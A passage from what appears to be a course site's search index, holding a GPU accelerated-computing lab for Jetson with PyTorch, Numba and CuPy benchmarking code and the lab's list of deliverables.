torch.randn(1000, 1000, device='cuda')\nB = torch.randn(1000, 1000, device='cuda')\nC = torch.matmul(A, B)\nprint(\"Sum:\", C.sum())\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#simple-nn-training-with-loss","title":"\u2705 Simple NN Training (with loss)","text":"<pre><code>model = torch.nn.Linear(256, 128).cuda()\ndata = torch.randn(64, 256).cuda()\nlabels = torch.randn(64, 128).cuda()\n\nloss_fn = torch.nn.MSELoss()\noptimizer = torch.optim.Adam(model.parameters())\n\nfor i in range(100):\n    optimizer.zero_grad()\n    output = model(data)\n    loss = loss_fn(output, labels)\n    loss.backward()\n    optimizer.step()\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#performance-measurement-tools","title":"\ud83d\udcc8 Performance Measurement Tools","text":""},{"location":"curriculum/my_01c_accelerated_computing/#torchcudaevent","title":"<code>torch.cuda.Event</code>","text":"<pre><code>start = torch.cuda.Event(enable_timing=True)\nend = torch.cuda.Event(enable_timing=True)\n\nstart.record()\n# ... run model\nend.record()\ntorch.cuda.synchronize()\nprint(\"Time:\", start.elapsed_time(end), \"ms\")\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#tegrastats-outside-container","title":"<code>tegrastats</code> (outside container)","text":"<pre><code>sudo tegrastats\n</code></pre> <p>Use <code>tegrastats</code> in host shell to monitor GPU usage, power, memory.</p>"},{"location":"curriculum/my_01c_accelerated_computing/#comprehensive-lab-accelerated-computing-mastery","title":"\ud83e\uddea Comprehensive Lab: Accelerated Computing Mastery","text":""},{"location":"curriculum/my_01c_accelerated_computing/#lab-objectives","title":"Lab Objectives","text":"<p>By completing this lab, you will:</p> <ol> <li>Analyze GPU Architecture: Understand hardware capabilities and limitations</li> <li>Implement Optimized Algorithms: Apply memory hierarchy and parallel computing principles</li> <li>Compare Acceleration Frameworks: Evaluate performance across different tools</li> <li>Profile and Optimize: Use advanced profiling techniques for performance tuning</li> <li>Deploy Real-world Solutions: Create production-ready accelerated applications</li> </ol>"},{"location":"curriculum/my_01c_accelerated_computing/#lab-setup","title":"Lab Setup","text":"<pre><code># Start Jetson container with all tools\ndocker run --rm -it --runtime nvidia \\\n  -v $(pwd):/workspace -w /workspace \\\n  --shm-size=2g \\\n  nvcr.io/nvidia/pytorch:24.04-py3 /bin/bash\n\n# Install additional dependencies\npip install matplotlib seaborn pycuda cupy-cuda11x\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#exercise-1-gpu-architecture-analysis","title":"Exercise 1: GPU Architecture Analysis","text":""},{"location":"curriculum/my_01c_accelerated_computing/#task-11-hardware-profiling","title":"Task 1.1: Hardware Profiling","text":"<pre><code>import pycuda.driver as cuda\nimport numpy as np\nfrom numba import cuda as numba_cuda\nimport time\nimport matplotlib.pyplot as plt\n\ndef analyze_gpu_architecture():\n    \"\"\"Comprehensive GPU architecture analysis\"\"\"\n\n    # Initialize CUDA\n    cuda.init()\n    device = cuda.Device(0)\n    context = device.make_context()\n\n    try:\n        # Get device properties\n        attrs = device.get_attributes()\n\n        print(\"=== GPU Architecture Analysis ===\")\n        print(f\"Device Name: {device.name()}\")\n        print(f\"Compute Capability: {device.compute_capability()}\")\n        print(f\"Total Memory: {device.total_memory() / 1024**3:.2f} GB\")\n        print(f\"Multiprocessors: {attrs[cuda.device_attribute.MULTIPROCESSOR_COUNT]}\")\n        print(f\"CUDA Cores per MP: {_get_cores_per_mp(device.compute_capability())}\")\n        print(f\"Total CUDA Cores: {attrs[cuda.device_attribute.MULTIPROCESSOR_COUNT] * _get_cores_per_mp(device.compute_capability())}\")\n        print(f\"Max Threads per Block: {attrs[cuda.device_attribute.MAX_THREADS_PER_BLOCK]}\")\n        print(f\"Max Block Dimensions: ({attrs[cuda.device_attribute.MAX_BLOCK_DIM_X]}, {attrs[cuda.device_attribute.MAX_BLOCK_DIM_Y]}, {attrs[cuda.device_attribute.MAX_BLOCK_DIM_Z]})\")\n        print(f\"Max Grid Dimensions: ({attrs[cuda.device_attribute.MAX_GRID_DIM_X]}, {attrs[cuda.device_attribute.MAX_GRID_DIM_Y]}, {attrs[cuda.device_attribute.MAX_GRID_DIM_Z]})\")\n        print(f\"Shared Memory per Block: {attrs[cuda.device_attribute.MAX_SHARED_MEMORY_PER_BLOCK] / 1024:.1f} KB\")\n        print(f\"Registers per Block: {attrs[cuda.device_attribute.MAX_REGISTERS_PER_BLOCK]}\")\n        print(f\"Warp Size: {attrs[cuda.device_attribute.WARP_SIZE]}\")\n        print(f\"Memory Clock Rate: {attrs[cuda.device_attribute.MEMORY_CLOCK_RATE] / 1000:.0f} MHz\")\n        print(f\"Memory Bus Width: {attrs[cuda.device_attribute.GLOBAL_MEMORY_BUS_WIDTH]} bits\")\n\n        # Calculate theoretical bandwidth\n        memory_clock_hz = attrs[cuda.device_attribute.MEMORY_CLOCK_RATE] * 1000\n        bus_width_bytes = attrs[cuda.device_attribute.GLOBAL_MEMORY_BUS_WIDTH] // 8\n        theoretical_bandwidth = 2 * memory_clock_hz * bus_width_bytes / 1e9  # GB/s\n        print(f\"Theoretical Memory Bandwidth: {theoretical_bandwidth:.1f} GB/s\")\n\n    finally:\n        context.pop()\n\n    return {\n        'name': device.name(),\n        'compute_capability': device.compute_capability(),\n        'multiprocessors': attrs[cuda.device_attribute.MULTIPROCESSOR_COUNT],\n        'theoretical_bandwidth': theoretical_bandwidth\n    }\n\ndef _get_cores_per_mp(compute_capability):\n    \"\"\"Get CUDA cores per multiprocessor based on compute capability\"\"\"\n    major, minor = compute_capability\n    if major == 8:  # Ampere (Orin)\n        return 128\n    elif major == 7:  # Turing/Volta\n        return 64\n    elif major == 6:  # Pascal\n        return 64\n    else:\n        return 32  # Default\n\n# Run architecture analysis\ngpu_info = analyze_gpu_architecture()\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#task-12-memory-bandwidth-benchmark","title":"Task 1.2: Memory Bandwidth Benchmark","text":"<pre><code>@numba_cuda.jit\ndef memory_bandwidth_kernel(data_in, data_out, n):\n    \"\"\"Simple memory copy kernel for bandwidth testing\"\"\"\n    idx = numba_cuda.grid(1)\n    if idx &lt; n:\n        data_out[idx] = data_in[idx]\n\ndef benchmark_memory_bandwidth(sizes):\n    \"\"\"Benchmark memory bandwidth for different data sizes\"\"\"\n\n    results = []\n\n    for size in sizes:\n        # Allocate data\n        data_in = numba_cuda.device_array(size, dtype=np.float32)\n        data_out = numba_cuda.device_array(size, dtype=np.float32)\n\n        # Configure kernel launch\n        threads_per_block = 256\n        blocks_per_grid = (size + threads_per_block - 1) // threads_per_block\n\n        # Warm up\n        for _ in range(3):\n            memory_bandwidth_kernel[blocks_per_grid, threads_per_block](data_in, data_out, size)\n        numba_cuda.synchronize()\n\n        # Benchmark\n        times = []\n        for _ in range(10):\n            start = time.perf_counter()\n            memory_bandwidth_kernel[blocks_per_grid, threads_per_block](data_in, data_out, size)\n            numba_cuda.synchronize()\n            end = time.perf_counter()\n            times.append(end - start)\n\n        avg_time = np.mean(times)\n        data_size_gb = size * 4 * 2 / 1e9  # Read + Write, 4 bytes per float32\n        bandwidth = data_size_gb / avg_time\n\n        results.append({\n            'size': size,\n            'time_ms': avg_time * 1000,\n            'bandwidth_gb_s': bandwidth\n        })\n\n        print(f\"Size: {size:&gt;10,} elements, Time: {avg_time*1000:6.2f} ms, Bandwidth: {bandwidth:6.1f} GB/s\")\n\n    return results\n\n# Run bandwidth benchmark\nsizes = [1024, 4096, 16384, 65536, 262144, 1048576, 4194304, 16777216]\nbandwidth_results = benchmark_memory_bandwidth(sizes)\n\n# Plot results\nplt.figure(figsize=(12, 5))\n\nplt.subplot(1, 2, 1)\nsizes_mb = [r['size'] * 4 / 1e6 for r in bandwidth_results]\nbandwidths = [r['bandwidth_gb_s'] for r in bandwidth_results]\nplt.semilogx(sizes_mb, bandwidths, 'bo-')\nplt.xlabel('Data Size (MB)')\nplt.ylabel('Bandwidth (GB/s)')\nplt.title('Memory Bandwidth vs Data Size')\nplt.grid(True)\n\nplt.subplot(1, 2, 2)\ntimes = [r['time_ms'] for r in bandwidth_results]\nplt.loglog(sizes_mb, times, 'ro-')\nplt.xlabel('Data Size (MB)')\nplt.ylabel('Time (ms)')\nplt.title('Execution Time vs Data Size')\nplt.grid(True)\n\nplt.tight_layout()\nplt.savefig('memory_bandwidth_analysis.png', dpi=150, bbox_inches='tight')\nplt.show()\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#task-13-occupancy-analysis","title":"Task 1.3: Occupancy Analysis","text":"<pre><code>def analyze_occupancy():\n    \"\"\"Analyze kernel occupancy for different configurations\"\"\"\n\n    @numba_cuda.jit\n    def test_kernel(data, shared_size):\n        # Allocate shared memory\n        shared_mem = numba_cuda.shared.array(shared_size, dtype=numba_cuda.float32)\n\n        idx = numba_cuda.grid(1)\n        tid = numba_cuda.threadIdx.x\n\n        if idx &lt; data.size:\n            # Use shared memory\n            if tid &lt; shared_size:\n                shared_mem[tid] = data[idx]\n\n            numba_cuda.syncthreads()\n\n            # Simple computation\n            if tid &lt; shared_size:\n                data[idx] = shared_mem[tid] * 2.0\n\n    # Test different configurations\n    data_size = 1024 * 1024\n    data = numba_cuda.device_array(data_size, dtype=np.float32)\n\n    configurations = [\n        (64, 128),   # threads_per_block, shared_memory_size\n        (128, 256),\n        (256, 512),\n        (512, 1024),\n        (1024, 2048)\n    ]\n\n    print(\"\\n=== Occupancy Analysis ===\")\n    print(f\"{'Threads/Block':&lt;15} {'Shared Mem':&lt;12} {'Blocks/Grid':&lt;12} {'Time (ms)':&lt;10} {'Occupancy':&lt;10}\")\n    print(\"-\" * 70)\n\n    for threads_per_block, shared_mem_size in configurations:\n        blocks_per_grid = (data_size + threads_per_block - 1) // threads_per_block\n\n        # Warm up\n        test_kernel[blocks_per_grid, threads_per_block](data, shared_mem_size)\n        numba_cuda.synchronize()\n\n        # Benchmark\n        times = []\n        for _ in range(5):\n            start = time.perf_counter()\n            test_kernel[blocks_per_grid, threads_per_block](data, shared_mem_size)\n            numba_cuda.synchronize()\n            end = time.perf_counter()\n            times.append(end - start)\n\n        avg_time = np.mean(times) * 1000\n\n        # Estimate occupancy (simplified)\n        max_threads_per_sm = 2048  # Typical for modern GPUs\n        estimated_occupancy = min(1.0, threads_per_block * blocks_per_grid / max_threads_per_sm)\n\n        print(f\"{threads_per_block:&lt;15} {shared_mem_size:&lt;12} {blocks_per_grid:&lt;12} {avg_time:&lt;10.2f} {estimated_occupancy:&lt;10.2f}\")\n\nanalyze_occupancy()\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#exercise-2-parallel-algorithm-implementation","title":"Exercise 2: Parallel Algorithm Implementation","text":""},{"location":"curriculum/my_01c_accelerated_computing/#task-21-optimized-parallel-reduction","title":"Task 2.1: Optimized Parallel Reduction","text":"<pre><code>@numba_cuda.jit\ndef parallel_reduction_optimized(data, result):\n    \"\"\"Optimized parallel reduction with multiple optimizations\"\"\"\n\n    # Shared memory for this block\n    shared_data = numba_cuda.shared.array(1024, dtype=numba_cuda.float32)\n\n    tid = numba_cuda.threadIdx.x\n    bid = numba_cuda.blockIdx.x\n    block_size = numba_cuda.blockDim.x\n    grid_size = numba_cuda.gridDim.x\n\n    # Global thread ID\n    idx = bid * block_size + tid\n\n    # Initialize shared memory\n    shared_data[tid] = 0.0\n\n    # Grid-stride loop for coalesced memory access\n    while idx &lt; data.size:\n        shared_data[tid] += data[idx]\n        idx += grid_size * block_size\n\n    numba_cuda.syncthreads()\n\n    # Parallel reduction in shared memory\n    stride = block_size // 2\n    while stride &gt; 0:\n        if tid &lt; stride:\n            shared_data[tid] += shared_data[tid + stride]\n        numba_cuda.syncthreads()\n        stride //= 2\n\n    # Write block result\n    if tid == 0:\n        numba_cuda.atomic.add(result, 0, shared_data[0])\n\ndef benchmark_reduction_methods(size):\n    \"\"\"Compare different reduction implementations\"\"\"\n\n    # Generate test data\n    np.random.seed(42)\n    host_data = np.random.randn(size).astype(np.float32)\n    device_data = numba_cuda.to_device(host_data)\n\n    print(f\"\\n=== Reduction Benchmark (Size: {size:,}) ===\")\n\n    # CPU reference\n    start = time.perf_counter()\n    cpu_result = np.sum(host_data)\n    cpu_time = time.perf_counter() - start\n    print(f\"CPU NumPy:           {cpu_time*1000:8.2f} ms, Result: {cpu_result:12.6f}\")\n\n    # GPU optimized reduction\n    result = numba_cuda.device_array(1, dtype=np.float32)\n    result[0] = 0.0\n\n    threads_per_block = 256\n    blocks_per_grid = min(32, (size + threads_per_block - 1) // threads_per_block)\n\n    # Warm up\n    parallel_reduction_optimized[blocks_per_grid, threads_per_block](device_data, result)\n    numba_cuda.synchronize()\n\n    # Benchmark\n    times = []\n    for _ in range(10):\n        result[0] = 0.0\n        start = time.perf_counter()\n        parallel_reduction_optimized[blocks_per_grid, threads_per_block](device_data, result)\n        numba_cuda.synchronize()\n        end = time.perf_counter()\n        times.append(end - start)\n\n    gpu_time = np.mean(times)\n    gpu_result = result[0]\n    speedup = cpu_time / gpu_time\n\n    print(f\"GPU Optimized:       {gpu_time*1000:8.2f} ms, Result: {gpu_result:12.6f}, Speedup: {speedup:6.1f}x\")\n    print(f\"Error: {abs(cpu_result - gpu_result):12.8f}\")\n\n    return {\n        'cpu_time': cpu_time,\n        'gpu_time': gpu_time,\n        'speedup': speedup,\n        'error': abs(cpu_result - gpu_result)\n    }\n\n# Test different sizes\nfor size in [1024, 10240, 102400, 1024000, 10240000]:\n    benchmark_reduction_methods(size)\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#task-22-matrix-transpose-optimization","title":"Task 2.2: Matrix Transpose Optimization","text":"<pre><code>@numba_cuda.jit\ndef matrix_transpose_naive(input_matrix, output_matrix, rows, cols):\n    \"\"\"Naive matrix transpose implementation\"\"\"\n    row = numba_cuda.blockIdx.y * numba_cuda.blockDim.y + numba_cuda.threadIdx.y\n    col = numba_cuda.blockIdx.x * numba_cuda.blockDim.x + numba_cuda.threadIdx.x\n\n    if row &lt; rows and col &lt; cols:\n        output_matrix[col, row] = input_matrix[row, col]\n\n@numba_cuda.jit\ndef matrix_transpose_optimized(input_matrix, output_matrix, rows, cols):\n    \"\"\"Optimized matrix transpose with shared memory tiling\"\"\"\n\n    TILE_SIZE = 32\n\n    # Shared memory tile\n    tile = numba_cuda.shared.array((TILE_SIZE, TILE_SIZE), dtype=numba_cuda.float32)\n\n    # Block and thread indices\n    bx = numba_cuda.blockIdx.x\n    by = numba_cuda.blockIdx.y\n    tx = numba_cuda.threadIdx.x\n    ty = numba_cuda.threadIdx.y\n\n    # Global coordinates for input\n    row = by * TILE_SIZE + ty\n    col = bx * TILE_SIZE + tx\n\n    # Load tile into shared memory\n    if row &lt; rows and col &lt; cols:\n        tile[ty, tx] = input_matrix[row, col]\n    else:\n        tile[ty, tx] = 0.0\n\n    numba_cuda.syncthreads()\n\n    # Global coordinates for output (transposed)\n    row_out = bx * TILE_SIZE + ty\n    col_out = by * TILE_SIZE + tx\n\n    # Write transposed tile to output\n    if row_out &lt; cols and col_out &lt; rows:\n        output_matrix[row_out, col_out] = tile[tx, ty]\n\ndef benchmark_transpose_methods(rows, cols):\n    \"\"\"Compare naive vs optimized matrix transpose\"\"\"\n\n    # Generate test data\n    np.random.seed(42)\n    host_input = np.random.randn(rows, cols).astype(np.float32)\n    device_input = numba_cuda.to_device(host_input)\n\n    print(f\"\\n=== Matrix Transpose Benchmark ({rows}x{cols}) ===\")\n\n    # CPU reference\n    start = time.perf_counter()\n    cpu_result = host_input.T.copy()\n    cpu_time = time.perf_counter() - start\n    print(f\"CPU NumPy:           {cpu_time*1000:8.2f} ms\")\n\n    # GPU Naive implementation\n    device_output_naive = numba_cuda.device_array((cols, rows), dtype=np.float32)\n\n    threads_per_block = (16, 16)\n    blocks_per_grid_x = (cols + threads_per_block[0] - 1) // threads_per_block[0]\n    blocks_per_grid_y = (rows + threads_per_block[1] - 1) // threads_per_block[1]\n    blocks_per_grid = (blocks_per_grid_x, blocks_per_grid_y)\n\n    # Warm up\n    matrix_transpose_naive[blocks_per_grid, threads_per_block](device_input, device_output_naive, rows, cols)\n    numba_cuda.synchronize()\n\n    # Benchmark naive\n    times = []\n    for _ in range(10):\n        start = time.perf_counter()\n        matrix_transpose_naive[blocks_per_grid, threads_per_block](device_input, device_output_naive, rows, cols)\n        numba_cuda.synchronize()\n        end = time.perf_counter()\n        times.append(end - start)\n\n    naive_time = np.mean(times)\n    naive_result = device_output_naive.copy_to_host()\n\n    # GPU Optimized implementation\n    device_output_opt = numba_cuda.device_array((cols, rows), dtype=np.float32)\n\n    TILE_SIZE = 32\n    threads_per_block_opt = (TILE_SIZE, TILE_SIZE)\n    blocks_per_grid_x_opt = (cols + TILE_SIZE - 1) // TILE_SIZE\n    blocks_per_grid_y_opt = (rows + TILE_SIZE - 1) // TILE_SIZE\n    blocks_per_grid_opt = (blocks_per_grid_x_opt, blocks_per_grid_y_opt)\n\n    # Warm up\n    matrix_transpose_optimized[blocks_per_grid_opt, threads_per_block_opt](device_input, device_output_opt, rows, cols)\n    numba_cuda.synchronize()\n\n    # Benchmark optimized\n    times = []\n    for _ in range(10):\n        start = time.perf_counter()\n        matrix_transpose_optimized[blocks_per_grid_opt, threads_per_block_opt](device_input, device_output_opt, rows, cols)\n        numba_cuda.synchronize()\n        end = time.perf_counter()\n        times.append(end - start)\n\n    opt_time = np.mean(times)\n    opt_result = device_output_opt.copy_to_host()\n\n    # Calculate speedups and errors\n    cpu_speedup = cpu_time / naive_time\n    opt_speedup = naive_time / opt_time\n    naive_error = np.max(np.abs(cpu_result - naive_result))\n    opt_error = np.max(np.abs(cpu_result - opt_result))\n\n    print(f\"GPU Naive:           {naive_time*1000:8.2f} ms, Speedup vs CPU: {cpu_speedup:6.1f}x, Error: {naive_error:.2e}\")\n    print(f\"GPU Optimized:       {opt_time*1000:8.2f} ms, Speedup vs Naive: {opt_speedup:6.1f}x, Error: {opt_error:.2e}\")\n\n    return {\n        'cpu_time': cpu_time,\n        'naive_time': naive_time,\n        'opt_time': opt_time,\n        'naive_speedup': cpu_speedup,\n        'opt_speedup': opt_speedup\n    }\n\n# Test different matrix sizes\nfor size in [(512, 512), (1024, 1024), (2048, 2048), (1024, 2048)]:\n    benchmark_transpose_methods(size[0], size[1])\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#exercise-3-framework-performance-comparison","title":"Exercise 3: Framework Performance Comparison","text":""},{"location":"curriculum/my_01c_accelerated_computing/#task-31-comprehensive-framework-benchmark","title":"Task 3.1: Comprehensive Framework Benchmark","text":"<pre><code>import cupy as cp\nimport torch\nimport matplotlib.pyplot as plt\nimport seaborn as sns\nfrom collections import defaultdict\n\ndef benchmark_frameworks():\n    \"\"\"Comprehensive benchmark across all frameworks\"\"\"\n\n    # Test configurations\n    matrix_sizes = [256, 512, 1024, 2048, 4096]\n    vector_sizes = [1024, 10240, 102400, 1024000, 10240000]\n\n    results = defaultdict(list)\n\n    print(\"\\n=== Framework Performance Comparison ===\")\n\n    # Matrix Multiplication Benchmark\n    print(\"\\n--- Matrix Multiplication ---\")\n    for size in matrix_sizes:\n        print(f\"\\nMatrix Size: {size}x{size}\")\n\n        # NumPy (CPU)\n        np.random.seed(42)\n        a_np = np.random.randn(size, size).astype(np.float32)\n        b_np = np.random.randn(size, size).astype(np.float32)\n\n        times = []\n        for _ in range(5):\n            start = time.perf_counter()\n            c_np = np.dot(a_np, b_np)\n            end = time.perf_counter()\n            times.append(end - start)\n        numpy_time = np.mean(times)\n\n        # CuPy (GPU)\n        a_cp = cp.asarray(a_np)\n        b_cp = cp.asarray(b_np)\n\n        # Warm up\n        c_cp = cp.dot(a_cp, b_cp)\n        cp.cuda.Stream.null.synchronize()\n\n        times = []\n        for _ in range(5):\n            start = time.perf_counter()\n            c_cp = cp.dot(a_cp, b_cp)\n            cp.cuda.Stream.null.synchronize()\n            end = time.perf_counter()\n            times.append(end - start)\n        cupy_time = np.mean(times)\n\n        # PyTorch (GPU)\n        a_torch = torch.from_numpy(a_np).cuda()\n        b_torch = torch.from_numpy(b_np).cuda()\n\n        # Warm up\n        c_torch = torch.matmul(a_torch, b_torch)\n        torch.cuda.synchronize()\n\n        times = []\n        for _ in range(5):\n            start = time.perf_counter()\n            c_torch = torch.matmul(a_torch, b_torch)\n            torch.cuda.synchronize()\n            end = time.perf_counter()\n            times.append(end - start)\n        pytorch_time = np.mean(times)\n\n        # Numba CUDA\n        @numba_cuda.jit\n        def matmul_kernel(A, B, C, M, N, K):\n            row = numba_cuda.blockIdx.y * numba_cuda.blockDim.y + numba_cuda.threadIdx.y\n            col = numba_cuda.blockIdx.x * numba_cuda.blockDim.x + numba_cuda.threadIdx.x\n\n            if row &lt; M and col &lt; N:\n                tmp = 0.0\n                for k in range(K):\n                    tmp += A[row, k] * B[k, col]\n                C[row, col] = tmp\n\n        a_numba = numba_cuda.to_device(a_np)\n        b_numba = numba_cuda.to_device(b_np)\n        c_numba = numba_cuda.device_array((size, size), dtype=np.float32)\n\n        threads_per_block = (16, 16)\n        blocks_per_grid_x = (size + threads_per_block[0] - 1) // threads_per_block[0]\n        blocks_per_grid_y = (size + threads_per_block[1] - 1) // threads_per_block[1]\n        blocks_per_grid = (blocks_per_grid_x, blocks_per_grid_y)\n\n        # Warm up\n        matmul_kernel[blocks_per_grid, threads_per_block](a_numba, b_numba, c_numba, size, size, size)\n        numba_cuda.synchronize()\n\n        times = []\n        for _ in range(5):\n            start = time.perf_counter()\n            matmul_kernel[blocks_per_grid, threads_per_block](a_numba, b_numba, c_numba, size, size, size)\n            numba_cuda.synchronize()\n            end = time.perf_counter()\n            times.append(end - start)\n        numba_time = np.mean(times)\n\n        # Store results\n        results['matmul_size'].append(size)\n        results['numpy_matmul'].append(numpy_time * 1000)\n        results['cupy_matmul'].append(cupy_time * 1000)\n        results['pytorch_matmul'].append(pytorch_time * 1000)\n        results['numba_matmul'].append(numba_time * 1000)\n\n        print(f\"  NumPy:   {numpy_time*1000:8.2f} ms\")\n        print(f\"  CuPy:    {cupy_time*1000:8.2f} ms (Speedup: {numpy_time/cupy_time:5.1f}x)\")\n        print(f\"  PyTorch: {pytorch_time*1000:8.2f} ms (Speedup: {numpy_time/pytorch_time:5.1f}x)\")\n        print(f\"  Numba:   {numba_time*1000:8.2f} ms (Speedup: {numpy_time/numba_time:5.1f}x)\")\n\n    # Element-wise Operations Benchmark\n    print(\"\\n--- Element-wise Operations (sin(x) + cos(x)) ---\")\n    for size in vector_sizes:\n        print(f\"\\nVector Size: {size:,}\")\n\n        # NumPy (CPU)\n        np.random.seed(42)\n        x_np = np.random.randn(size).astype(np.float32)\n\n        times = []\n        for _ in range(5):\n            start = time.perf_counter()\n            y_np = np.sin(x_np) + np.cos(x_np)\n            end = time.perf_counter()\n            times.append(end - start)\n        numpy_time = np.mean(times)\n\n        # CuPy (GPU)\n        x_cp = cp.asarray(x_np)\n\n        # Warm up\n        y_cp = cp.sin(x_cp) + cp.cos(x_cp)\n        cp.cuda.Stream.null.synchronize()\n\n        times = []\n        for _ in range(5):\n            start = time.perf_counter()\n            y_cp = cp.sin(x_cp) + cp.cos(x_cp)\n            cp.cuda.Stream.null.synchronize()\n            end = time.perf_counter()\n            times.append(end - start)\n        cupy_time = np.mean(times)\n\n        # PyTorch (GPU)\n        x_torch = torch.from_numpy(x_np).cuda()\n\n        # Warm up\n        y_torch = torch.sin(x_torch) + torch.cos(x_torch)\n        torch.cuda.synchronize()\n\n        times = []\n        for _ in range(5):\n            start = time.perf_counter()\n            y_torch = torch.sin(x_torch) + torch.cos(x_torch)\n            torch.cuda.synchronize()\n            end = time.perf_counter()\n            times.append(end - start)\n        pytorch_time = np.mean(times)\n\n        # Numba CUDA\n        @numba_cuda.jit\n        def elementwise_kernel(x, y, n):\n            idx = numba_cuda.grid(1)\n            if idx &lt; n:\n                y[idx] = numba_cuda.libdevice.sinf(x[idx]) + numba_cuda.libdevice.cosf(x[idx])\n\n        x_numba = numba_cuda.to_device(x_np)\n        y_numba = numba_cuda.device_array(size, dtype=np.float32)\n\n        threads_per_block = 256\n        blocks_per_grid = (size + threads_per_block - 1) // threads_per_block\n\n        # Warm up\n        elementwise_kernel[blocks_per_grid, threads_per_block](x_numba, y_numba, size)\n        numba_cuda.synchronize()\n\n        times = []\n        for _ in range(5):\n            start = time.perf_counter()\n            elementwise_kernel[blocks_per_grid, threads_per_block](x_numba, y_numba, size)\n            numba_cuda.synchronize()\n            end = time.perf_counter()\n            times.append(end - start)\n        numba_time = np.mean(times)\n\n        # Store results\n        results['elementwise_size'].append(size)\n        results['numpy_elementwise'].append(numpy_time * 1000)\n        results['cupy_elementwise'].append(cupy_time * 1000)\n        results['pytorch_elementwise'].append(pytorch_time * 1000)\n        results['numba_elementwise'].append(numba_time * 1000)\n\n        print(f\"  NumPy:   {numpy_time*1000:8.2f} ms\")\n        print(f\"  CuPy:    {cupy_time*1000:8.2f} ms (Speedup: {numpy_time/cupy_time:5.1f}x)\")\n        print(f\"  PyTorch: {pytorch_time*1000:8.2f} ms (Speedup: {numpy_time/pytorch_time:5.1f}x)\")\n        print(f\"  Numba:   {numba_time*1000:8.2f} ms (Speedup: {numpy_time/numba_time:5.1f}x)\")\n\n    return dict(results)\n\n# Run comprehensive benchmark\nbenchmark_results = benchmark_frameworks()\n\n# Plot results\nfig, axes = plt.subplots(2, 2, figsize=(15, 12))\n\n# Matrix multiplication performance\nax1 = axes[0, 0]\nsizes = benchmark_results['matmul_size']\nax1.loglog(sizes, benchmark_results['numpy_matmul'], 'o-', label='NumPy (CPU)', linewidth=2)\nax1.loglog(sizes, benchmark_results['cupy_matmul'], 's-', label='CuPy (GPU)', linewidth=2)\nax1.loglog(sizes, benchmark_results['pytorch_matmul'], '^-', label='PyTorch (GPU)', linewidth=2)\nax1.loglog(sizes, benchmark_results['numba_matmul'], 'd-', label='Numba CUDA', linewidth=2)\nax1.set_xlabel('Matrix Size')\nax1.set_ylabel('Time (ms)')\nax1.set_title('Matrix Multiplication Performance')\nax1.legend()\nax1.grid(True, alpha=0.3)\n\n# Matrix multiplication speedup\nax2 = axes[0, 1]\nnumpy_times = np.array(benchmark_results['numpy_matmul'])\ncupy_speedup = numpy_times / np.array(benchmark_results['cupy_matmul'])\npytorch_speedup = numpy_times / np.array(benchmark_results['pytorch_matmul'])\nnumba_speedup = numpy_times / np.array(benchmark_results['numba_matmul'])\n\nax2.semilogx(sizes, cupy_speedup, 's-', label='CuPy vs NumPy', linewidth=2)\nax2.semilogx(sizes, pytorch_speedup, '^-', label='PyTorch vs NumPy', linewidth=2)\nax2.semilogx(sizes, numba_speedup, 'd-', label='Numba vs NumPy', linewidth=2)\nax2.set_xlabel('Matrix Size')\nax2.set_ylabel('Speedup Factor')\nax2.set_title('Matrix Multiplication Speedup')\nax2.legend()\nax2.grid(True, alpha=0.3)\n\n# Element-wise performance\nax3 = axes[1, 0]\nsizes = benchmark_results['elementwise_size']\nax3.loglog(sizes, benchmark_results['numpy_elementwise'], 'o-', label='NumPy (CPU)', linewidth=2)\nax3.loglog(sizes, benchmark_results['cupy_elementwise'], 's-', label='CuPy (GPU)', linewidth=2)\nax3.loglog(sizes, benchmark_results['pytorch_elementwise'], '^-', label='PyTorch (GPU)', linewidth=2)\nax3.loglog(sizes, benchmark_results['numba_elementwise'], 'd-', label='Numba CUDA', linewidth=2)\nax3.set_xlabel('Vector Size')\nax3.set_ylabel('Time (ms)')\nax3.set_title('Element-wise Operations Performance')\nax3.legend()\nax3.grid(True, alpha=0.3)\n\n# Element-wise speedup\nax4 = axes[1, 1]\nnumpy_times = np.array(benchmark_results['numpy_elementwise'])\ncupy_speedup = numpy_times / np.array(benchmark_results['cupy_elementwise'])\npytorch_speedup = numpy_times / np.array(benchmark_results['pytorch_elementwise'])\nnumba_speedup = numpy_times / np.array(benchmark_results['numba_elementwise'])\n\nax4.semilogx(sizes, cupy_speedup, 's-', label='CuPy vs NumPy', linewidth=2)\nax4.semilogx(sizes, pytorch_speedup, '^-', label='PyTorch vs NumPy', linewidth=2)\nax4.semilogx(sizes, numba_speedup, 'd-', label='Numba vs NumPy', linewidth=2)\nax4.set_xlabel('Vector Size')\nax4.set_ylabel('Speedup Factor')\nax4.set_title('Element-wise Operations Speedup')\nax4.legend()\nax4.grid(True, alpha=0.3)\n\nplt.tight_layout()\nplt.savefig('framework_performance_comparison.png', dpi=150, bbox_inches='tight')\nplt.show()\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#lab-deliverables","title":"Lab Deliverables","text":""},{"location":"curriculum/my_01c_accelerated_computing/#required-submissions","title":"Required Submissions","text":"<ol> <li>Performance Analysis Report (PDF, 5-8 pages)</li> <li>GPU architecture analysis with hardware specifications</li> <li>Memory bandwidth benchmarks and analysis</li> <li>Occupancy analysis for different kernel configurations</li> <li>Framework performance comparison with detailed charts</li> <li> <p>Optimization recommendations based on findings</p> </li> <li> <p>Optimized Algorithm Implementations (Python files)</p> </li> <li><code>gpu_architecture_analysis.py</code>: Complete hardware profiling code</li> <li><code>optimized_algorithms.py</code>: Parallel reduction and matrix transpose implementations</li> <li><code>framework_benchmark.py</code>: Comprehensive framework comparison</li> <li> <p>All code must be well-documented with performance comments</p> </li> <li> <p>Profiling Results (Data files and visualizations)</p> </li> <li><code>memory_bandwidth_analysis.png</code>: Bandwidth vs data size plots</li> <li><code>framework_performance_comparison.png</code>: Performance comparison charts</li> <li><code>profiling_data.json</code>: Raw benchmark data in JSON format</li> <li> <p><code>optimization_analysis.txt</code>: Detailed analysis of optimization techniques</p> </li> <li> <p>Framework Comparison Study (Technical report)</p> </li> <li>Quantitative comparison of NumPy, CuPy, PyTorch, and 